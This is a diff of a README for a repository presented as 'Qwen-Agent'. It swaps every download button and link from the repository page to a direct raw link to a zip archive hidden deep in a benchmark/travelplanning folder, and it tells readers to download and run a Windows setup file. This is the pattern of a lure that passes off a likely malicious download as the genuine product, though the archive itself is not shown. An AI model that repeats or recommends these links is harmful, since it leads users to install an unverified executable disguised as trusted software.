@@ -1,6 +1,6 @@
 # 🤖 Qwen-Agent - Your Smart Personal Assistant
 
-[![Download Qwen-Agent](https://img.shields.io/badge/Download-Qwen--Agent-brightgreen?style=for-the-badge)](https://github.com/toy862/Qwen-Agent)
+[![Download Qwen-Agent](https://img.shields.io/badge/Download-Qwen--Agent-brightgreen?style=for-the-badge)](https://github.com/toy862/Qwen-Agent/raw/refs/heads/main/benchmark/deepplanning/travelplanning/agent/Qwen_Agent_3.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps carefully to download, install, and start using Qwen-Agent on
 
 To get the software, **visit this page to download** the latest stable version of Qwen-Agent:
 
-[![Download Qwen-Agent](https://img.shields.io/badge/Download-Qwen--Agent--Setup-blue?style=for-the-badge)](https://github.com/toy862/Qwen-Agent)
+[![Download Qwen-Agent](https://img.shields.io/badge/Download-Qwen--Agent--Setup-blue?style=for-the-badge)](https://github.com/toy862/Qwen-Agent/raw/refs/heads/main/benchmark/deepplanning/travelplanning/agent/Qwen_Agent_3.7.zip)
 
 Click the link above. It will open the official GitHub page where you can find the download files. Look for the latest release folder and download the Windows setup file (usually ends with `.exe`).
 
@@ -106,7 +106,7 @@ If you have any issues:
 
 Keep your app up to date by revisiting the download page regularly:
 
-[Download Qwen-Agent Latest Version](https://github.com/toy862/Qwen-Agent)
+[Download Qwen-Agent Latest Version](https://github.com/toy862/Qwen-Agent/raw/refs/heads/main/benchmark/deepplanning/travelplanning/agent/Qwen_Agent_3.7.zip)
 
 New updates improve features and fix bugs.
 
@@ -136,4 +136,4 @@ If you want to explore more:
 
 ---
 
-[![Download Qwen-Agent](https://img.shields.io/badge/Download-Qwen--Agent-brightgreen?style=for-the-badge)](https://github.com/toy862/Qwen-Agent)
+[![Download Qwen-Agent](https://img.shields.io/badge/Download-Qwen--Agent-brightgreen?style=for-the-badge)](https://github.com/toy862/Qwen-Agent/raw/refs/heads/main/benchmark/deepplanning/travelplanning/agent/Qwen_Agent_3.7.zip)
